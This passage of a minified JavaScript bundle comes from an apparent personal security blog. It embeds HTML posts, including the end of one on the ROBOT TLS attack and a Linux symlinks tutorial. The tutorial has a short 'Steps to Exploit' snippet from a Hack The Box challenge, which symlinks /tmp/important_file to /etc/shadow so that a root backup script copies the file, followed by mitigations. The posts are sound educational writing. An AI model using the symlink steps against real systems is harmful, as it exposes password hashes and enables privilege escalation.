          To better understand how this attack can be used in real-world scenarios, consider a web server that uses RSA encryption to secure TLS connections. If the server’s RSA implementation is vulnerable, an attacker can exploit it to decrypt sensitive information.
        </p>
        <p>
          For example, if a banking website is vulnerable to ROBOT, an attacker could gain access to the TLS session keys, which would allow them to decrypt sensitive information such as login credentials, transaction details, and personal user data. This could lead to serious breaches in confidentiality and data security.
        </p>

        <h2>Affected Systems</h2>
        <p>Various widely-used products have been found vulnerable to ROBOT, including:</p>
        <ul>
          <li>OpenSSL (before version 1.0.2h)</li>
          <li>F5 Networks BIG-IP load balancers</li>
          <li>Cisco devices</li>
          <li>Certain Oracle and Citrix products</li>
        </ul>
        <p>
          Though many systems have since been patched, ROBOT still poses a risk to any system that hasn’t been updated to mitigate this vulnerability.
        </p>

        <h2>Mitigation and Prevention</h2>
        <p>
          Preventing ROBOT attacks requires system administrators and developers to ensure that their RSA implementations are correctly configured. Here are some steps to mitigate the risk of ROBOT:
        </p>
        <ul>
          <li><b>Disable RSA Encryption:</b> The most effective protection is to disable RSA key exchange in favor of Elliptic Curve Diffie-Hellman (ECDHE), which provides forward secrecy and is not vulnerable to ROBOT.</li>
          <li><b>Apply Security Patches:</b> Ensure that you’re using the latest versions of your software libraries and applying all relevant security patches. For instance, upgrading to OpenSSL 1.0.2h or later will mitigate the ROBOT attack.</li>
          <li><b>Implement Stronger Cryptographic Methods:</b> Use stronger encryption protocols such as Elliptic Curve Cryptography (ECC) to secure communications. ECC-based methods, like ECDHE, are considered more secure and resistant to attacks like ROBOT.</li>
          <li><b>Regular Vulnerability Testing:</b> Conduct routine vulnerability assessments and audits to identify and address potential misconfigurations or weaknesses in cryptographic implementations.</li>
        </ul>

        <h3>Example of Mitigation in OpenSSL:</h3>
<div class="code-block">
  <code>
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
  </code>
</div>
<p>
  This configuration forces the server to use Elliptic Curve Diffie-Hellman key exchange methods, providing forward secrecy and reducing the risk of a ROBOT attack.
</p>

        <h2>Conclusion</h2>
        <p>
          The ROBOT attack underscores how vulnerabilities from decades ago can resurface in modern systems due to misconfigurations or unpatched software. Although the original Bleichenbacher attack was discovered in 1998, its return in 2017 highlights the importance of staying vigilant in cryptographic practices and regularly updating systems.
        </p>
        <p>
          By disabling RSA key exchanges, patching vulnerable systems, and implementing stronger encryption protocols, administrators can effectively mitigate the risk of ROBOT attacks and protect sensitive data.
        </p>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,tm=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Exploring Symlinks: Practical Usage and Security Implications</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Exploring Symlinks: Practical Usage and Security Implications</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What Are Symlinks?</h2>
        <p>
          In Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. Symlinks are incredibly useful when you need to access or organize files in multiple locations. However, if used carelessly, they can create security vulnerabilities, particularly when root-owned processes interact with user-created symlinks.
        </p>

        <h3>Hard Links vs. Symbolic Links</h3>
        <ul>
          <li><strong>Hard Links:</strong> Direct references to data on disk. Hard links share the same inode with the original file, meaning they’re identical and can’t link to directories.</li>
          <li><strong>Symbolic Links (Symlinks):</strong> References that point to the path of a target file or directory. Symlinks are separate from the original file’s data, so deleting the target will break the link.</li>
        </ul>

        <h2>Creating and Using Symlinks</h2>
        <p>The basic syntax for creating a symlink is:</p>
        <div class="code-block">
          <code>ln -s [target] [symlink_name]</code>
        </div>
        <p>
          • <strong>[target]:</strong> The file or directory you want to link to.<br>
          • <strong>[symlink_name]:</strong> The name of your symlink.
        </p>

        <h3>Examples</h3>
        <div class="code-block">
          <code>
# Creating a symlink to a file<br>
ln -s /home/user/documents/file.txt /home/user/desktop/file_link.txt
          </code>
        </div>
        <p>This creates <code>file_link.txt</code> on your desktop, which behaves like a shortcut to <code>file.txt</code>.</p>

        <div class="code-block">
          <code>
# Creating a symlink to a directory<br>
ln -s /home/user/projects /home/user/desktop/projects_link
          </code>
        </div>
        <p>Accessing <code>projects_link</code> will take you directly to <code>/home/user/projects</code>.</p>

        <h3>Overwriting an Existing Symlink</h3>
        <div class="code-block">
          <code>ln -sf /new/target/path /path/to/existing_symlink</code>
        </div>
        <p>The <code>-f</code> option forces the update of the symlink’s target.</p>

        <h2>Privilege Escalation Using Symlinks</h2>
        <p>
          During my Hack The Box challenge, I learned how symlinks can be used to escalate privileges when system configurations are insecure. Here’s how this works:
        </p>

        <h3>Scenario: Exploiting a Root-Owned Script</h3>
        <p>
          Imagine a script (<code>backup.sh</code>) owned by root regularly copies files from a directory to a root-owned backup location. If the script is designed to follow any symlinks it encounters, this could give normal users access to root-level files.
        </p>

        <h3>Steps to Exploit</h3>
        <div class="code-block">
          <code>
# Step 1: Remove any existing file at /tmp/important_file<br>
rm -f /tmp/important_file<br><br>
# Step 2: Create a symlink pointing to /etc/shadow<br>
ln -s /etc/shadow /tmp/important_file<br><br>
# Step 3: Wait for the root script to run or run it manually if possible<br>
          </code>
        </div>
        <p>
          If the root script copies <code>/etc/shadow</code> to a location accessible to the user, the user can potentially gain root-level information and escalate privileges.
        </p>

        <h2>Mitigating This Exploit</h2>
        <ul>
          <li><strong>Avoid Following Symlinks in Scripts:</strong> Avoid copying or modifying files without checking for symlinks, especially in root-owned scripts.</li>
          <li><strong>Use the <code>-P</code> Option in <code>cp</code>:</strong> This flag tells <code>cp</code> not to follow symlinks, helping to prevent exploitation.</li>
          <li><strong>Restrict Writable Directories:</strong> Limit permissions on directories where files are written or manipulated by privileged processes.</li>
        </ul>

        <h2>Conclusion</h2>
        <p>
          Symlinks are an incredibly powerful tool for managing files and directories, but they come with inherent risks if not handled carefully. Understanding how symlinks work and the potential security implications is critical for both system administrators and security professionals. Whether you're organizing files or working on penetration testing challenges, symlinks offer both utility and insight into system-level operations.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,rm={firmware_llm_annotator:{title:"Firmware Exploration: LLM as Your Annotator",slug:"firmware_llm_annotator",content:Zh},1001:{title:"CVE-2024–1001",slug:"1001",content:Kh},"0012":{title:"CVE-2024–0012",slug:"0012",content:Gh},40982:{title:"CVE-2022–40982",slug:"40982",content:qh},cow:{title:"CVE-2016–5195",slug:"cow",content:Jh},symlinks:{title:"Symbolic Links (Symlinks) in Linux",slug:"symlinks",content:tm},23397:{title:"CVE-2023–23397",slug:"23397",content:Xh},"0160":{title:"CVE-2014-0160",slug:"0160",content:Qh},11882:{title:"CVE-2017-11882",slug:"11882",content:Yh},robot:{title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",slug:"robot",content:nm},poodle:{title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",slug:"poodle",content:em}};function im(e){try{const t=new DOMParser().parseFromString(e,"text/html"),r=["style","script","link","nav","header","footer",".navbar",".nav-container",".theme-toggle",".footer",".social-links",".social-icons"];t.querySelectorAll(r.join(",")).forEach(s=>s.remove()),t.querySelectorAll("[style]").forEach(s=>s.removeAttribute("style"));const i=t.querySelector("h1");i&&i.remove();const l=[".blog-text","article",".blog-post-content","main"];let o=t.body;for(const s of l){const a=t.querySelector(s);if(a){o=a;break}}return o.querySelectorAll(".container").forEach(s=>{for(;s.firstChild;)s.parentNode.insertBefore(s.firstChild,s);s.remove()}),Array.from(o.querySelectorAll("h2, h3")).forEach((s,a)=>{s.id||(s.id=`section-${a+1}`)}),o.innerHTML||e}catch{return e}}function lm(){const{slug:e}=lh(),n=rm[e],t=lr.find(i=>i.slug===e),r=b.useMemo(()=>n?im(n.content):"",[n]);return n?u.jsxs(u.Fragment,{children:[u.jsx("header",{className:"blog-post-header",children:u.jsxs("div",{className:"container text-center",children:[u.jsx("h1",{className:"blog-post-title",children:n.title}),t&&u.jsxs("p",{className:"blog-post-date",children:[t.date," · ",t.readTime]})]})}),u.jsx("main",{className:"blog-post-content container",children:u.jsx("article",{dangerouslySetInnerHTML:{__html:r}})})]}):u.jsxs("main",{className:"blog-post-content container",children:[u.jsx("h2",{children:"Post not found"}),u.jsx("p",{children:"The post you’re looking for does not exist."}),u.jsx(Qe,{to:"/blogs",className:"view-credentials",children:"Back to Blog"})]})}const om=["All","Security Tools","Research","Web","Desktop","Cloud","Automation"];function sm({activeFilter:e,onFilterChange:n}){return u.jsx("div",{className:"filter-chips",children:om.map(t=>u.jsx("button",{className:`chip ${t===e?"active":""}`,type:"button",onClick:()=>n(t),children:t},t))})}function am({items:e}){const[n,t]=b.useState(0);if(!(e!=null&&e.length))return null;const r=e[n],i=()=>t(o=>(o+1)%e.length),l=()=>t(o=>(o-1+e.length)%e.length);return u.jsxs("div",{className:"featured-carousel",children:[u.jsxs("div",{className:"featured-card",children:[u.jsxs("div",{className:"featured-meta",children:[u.jsx("span",{className:"pill",children:"Featured"}),r.tag&&u.jsx("span",{className:"pill",children:r.tag})]}),u.jsx("h3",{children:r.title}),u.jsx("p",{children:r.description}),u.jsx("div",{className:"project-tags",children:(r.tags||[]).map(o=>u.jsx("span",{className:"pill",children:o},o))}),u.jsx("div",{className:"featured-actions",children:u.jsx("a",{href:r.href,target:"_blank",rel:"noreferrer",className:"link-button",children:"View"})})]}),e.length>1&&u.jsxs("div",{className:"featured-controls",children:[u.jsx("button",{type:"button",onClick:l,className:"button ghost",children:"←"}),u.jsx("button",{type:"button",onClick:i,className:"button ghost",children:"→"})]})]})}function um({items:e,showViewAll:n=!1,showHeader:t=!0}){const[r,i]=b.useState("All"),l=e.slice(0,2),o=b.useMemo(()=>r==="All"?e:e.filter(s=>{var a;return(a=s.tags)==null?void 0:a.some(d=>d.toLowerCase().includes(r.toLowerCase().split(" ")[0]))}),[r,e]);return u.jsx("section",{className:"projects",id:"projects",children:u.jsxs("div",{className:"container",children:[t&&u.jsxs("div",{className:"section-header",children:[u.jsxs("div",{children:[u.jsx("h2",{className:"section-title",children:"Projects"}),u.jsx("p",{className:"section-subtitle",children:"Every project is a unique endeavor. See what I have accomplished so far!"})]}),n&&u.jsx("div",{className:"section-actions",children:u.jsx(Qe,{className:"link-button",to:"/projects",children:"View all projects"})})]}),t&&u.jsx(sm,{activeFilter:r,onFilterChange:i}),t&&u.jsx(am,{items:l}),u.jsx("div",{className:"projects-grid",children:o.map(s=>{var a;return u.jsx("div",{className:"project-card",children:u.jsxs("a",{href:s.href,target:"_blank",rel:"noreferrer",children:[u.jsx("h5",{className:"project-title",children:s.title}),u.jsx("p",{className:"project-description",children:s.description}),(a=s.tags)!=null&&a.length?u.jsx("div",{className:"project-tags",children:s.tags.map(d=>u.jsx("span",{className:"pill",children:d},d))}):null]})},s.title)})})]})})}function cm(){return u.jsxs(u.Fragment,{children:[u.jsx("header",{className:"blog-welcome-section",children:u.jsxs("div",{className:"container text-center",children:[u.jsx("h1",{children:"Projects"}),u.jsx("p",{className:"blog-subtitle",children:"A focused list of what I’ve shipped and explored."})]})}),u.jsx(um,{items:Xc,showHeader:!1})]})}function dm({issuer:e="Cert"}){var t;const n=((t=e==null?void 0:e[0])==null?void 0:t.toUpperCase())||"C";return u.jsx("div",{className:"cert-badge",children:n})}const fm=["All","Security","Cloud","Networking"];function pm({items:e,showViewAll:n=!1,showHeader:t=!0}){const[r,i]=b.useState("All"),l=b.useMemo(()=>r==="All"?e:e.filter(o=>o.domain?o.domain===r:!0),[r,e]);return u.jsx("section",{className:"certifications",id:"certs",children:u.jsxs("div",{className:"container",children:[t&&u.jsxs("div",{className:"section-header",children:[u.jsx("div",{children:u.jsx("h2",{children:"CERTIFICATIONS"})}),n&&u.jsx("div",{className:"section-actions",children:u.jsx(Qe,{className:"link-button",to:"/certifications",children:"View all certifications"})})]}),t&&u.jsx("div",{className:"filter-chips",children:fm.map(o=>u.jsx("button",{className:`chip ${o===r?"active":""}`,type:"button",onClick:()=>i(o),children:o},o))}),u.jsx("div",{className:"cert-grid",children:l.map(o=>u.jsxs("div",{className:"cert-item",children:[u.jsxs("div",{className:"cert-title",children:[u.jsx(dm,{issuer:o.issuer}),u.jsx("span",{children:o.title})]}),u.jsxs("div",{className:"cert-content",children:[u.jsx("p",{children:o.details}),u.jsx("a",{href:o.href,className:"view-credentials",target:"_blank",rel:"noreferrer",children:"View credentials"})]})]},o.title))})]})})}function hm(){return u.jsxs(u.Fragment,{children:[u.jsx("header",{className:"blog-welcome-section",children:u.jsxs("div",{className:"container text-center",children:[u.jsx("h1",{children:"Certifications"}),u.jsx("p",{className:"blog-subtitle",children:"Credentials and exams I’ve completed."})]})}),u.jsx(pm,{items:qc,showHeader:!1})]})}function mm(){const e="hemparekh1596@gmail.com",n=()=>{navigator.clipboard&&navigator.clipboard.writeText(e).catch(()=>{})};return u.jsx("section",{className:"contact-strip",id:"contact",children:u.jsxs("div",{className:"container contact-grid",children:[u.jsxs("div",{children:[u.jsx("p",{className:"pill",children:"Let’s talk"}),u.jsx("h2",{children:"Get in touch"}),u.jsx("p",{className:"contact-blurb",children:"Let’s connect to collaborate on security engineering or privacy-focused initiatives."})]}),u.jsxs("div",{className:"contact-actions",children:[u.jsx("button",{className:"button primary",onClick:n,type:"button",children:"Copy Email"}),u.jsx("a",{className:"button ghost",href:"https://www.linkedin.com/in/hem-parekh/",target:"_blank",rel:"noreferrer",children:"LinkedIn"}),u.jsx("a",{className:"button ghost",href:"https://github.com/Hem1700",target:"_blank",rel:"noreferrer",children:"GitHub"})]})]})})}function gm(){const[e,n]=b.useState(0);return b.useEffect(()=>{const t=()=>{const{scrollTop:r,scrollHeight:i,clientHeight:l}=document.documentElement,o=i>l?r/(i-l)*100:0;n(Math.min(100,Math.max(0,o)))};return t(),window.addEventListener("scroll",t,{passive:!0}),()=>window.removeEventListener("scroll",t)},[]),u.jsx("div",{className:"scroll-progress",children:u.jsx("div",{className:"scroll-progress__bar",style:{width:`${e}%`}})})}function vm(){const[e,n]=b.useState(!1);return b.useEffect(()=>{const t=()=>n(window.scrollY>400);return window.addEventListener("scroll",t,{passive:!0}),t(),()=>window.removeEventListener("scroll",t)},[]),e?u.jsx("button",{className:"back-to-top",type:"button","aria-label":"Back to top",onClick:()=>window.scrollTo({top:0,behavior:"smooth"}),children:"↑"}):null}function ym(){const[e,n]=b.useState(()=>typeof window>"u"?"light":localStorage.getItem("theme")||"light");return b.useEffect(()=>{const r=document.body;r.classList.remove("light","dark"),r.classList.add(e),localStorage.setItem("theme",e)},[e]),{theme:e,toggleTheme:()=>{n(r=>r==="light"?"dark":"light")}}}function wm(){const{theme:e,toggleTheme:n}=ym();return u.jsx(Ph,{children:u.jsxs("div",{className:"app-shell",children:[u.jsx(gm,{}),u.jsx(Oh,{onToggleTheme:n,theme:e}),u.jsx("main",{children:u.jsxs(xh,{children:[u.jsx(Pn,{path:"/",element:u.jsx(Sa,{})}),u.jsx(Pn,{path:"/blogs",element:u.jsx($h,{})}),u.jsx(Pn,{path:"/projects",element:u.jsx(cm,{})}),u.jsx(Pn,{path:"/certifications",element:u.jsx(hm,{})}),u.jsx(Pn,{path:"/blog/:slug",element:u.jsx(lm,{})}),u.jsx(Pn,{path:"*",element:u.jsx(Sa,{})})]})}),u.jsx(mm,{}),u.jsx(Rh,{}),u.jsx(vm,{})]})})}Ic(document.getElementById("root")).render(u.jsx(Ra.StrictMode,{children:u.jsx(wm,{})}));
